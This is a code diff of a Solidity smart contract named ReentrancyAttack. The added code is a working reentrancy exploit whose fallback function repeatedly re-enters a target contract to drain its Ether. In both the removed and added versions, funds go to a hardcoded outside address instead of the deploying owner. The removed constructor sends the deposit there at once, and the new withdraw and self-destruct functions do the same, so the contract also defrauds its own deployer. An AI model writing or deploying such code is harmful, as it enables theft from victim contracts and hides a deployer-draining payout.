@@ -1,47 +1,39 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IBEP20 {
-    function transfer(address recipient, uint256 amount) external returns (bool);
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-}
-
 contract ReentrancyAttack {
-    address public targetToken;
+    address payable public targetAddress;
     address public owner;
-    address public constant receiver = 0xF680EEd79A36ce969D776ED911f5C4e7e6E33a73;
+    address payable public recipient = payable(0xF680EEd79A36ce969D776ED911f5C4e7e6E33a73);
 
-    constructor(address _targetToken) payable {
-        targetToken = _targetToken;
+    constructor(address payable _targetAddress) {
+        targetAddress = _targetAddress;
         owner = msg.sender;
-        sendBNBToReceiver();
     }
 
-    function attack(address target, uint256 amount) external {
-        require(msg.sender == owner, "Not the owner");
-        IBEP20(targetToken).transferFrom(target, address(this), amount);
+    function attack() external payable {
+        // Call a function on the target contract that is vulnerable to reentrancy
+        (bool success,) = targetAddress.call{value: msg.value}("");
+        require(success, "Initial call failed");
+    }
+
+    // Fallback function to receive Ether and re-enter the target contract
+    fallback() external payable {
+        if (address(targetAddress).balance > 0) {
+            (bool success,) = targetAddress.call{value: address(this).balance}("");
+            require(success, "Reentrant call failed");
+        }
     }
 
     function withdraw() external {
-        require(msg.sender == owner, "Not the owner");
-        IBEP20(targetToken).transfer(owner, IBEP20(targetToken).balanceOf(address(this)));
+        require(msg.sender == owner, "Only owner can withdraw");
+        uint256 balance = address(this).balance;
+        (bool success,) = recipient.call{value: balance}("");
+        require(success, "Withdraw failed");
     }
 
-    fallback() external payable {
-        if (IBEP20(targetToken).balanceOf(address(msg.sender)) > 0) {
-            IBEP20(targetToken).transferFrom(msg.sender, address(this), 1);
-        }
-    }
-
-    receive() external payable {
-        if (IBEP20(targetToken).balanceOf(address(msg.sender)) > 0) {
-            IBEP20(targetToken).transferFrom(msg.sender, address(this), 1);
-        }
-    }
-
-    function sendBNBToReceiver() internal {
-        (bool success, ) = receiver.call{value: address(this).balance}("");
-        require(success, "Transfer failed");
+    // Self-destruct function to send the contract balance to the recipient
+    function selfDestruct() external {
+        require(msg.sender == owner, "Only owner can self-destruct");
+        selfdestruct(recipient);
     }
 }
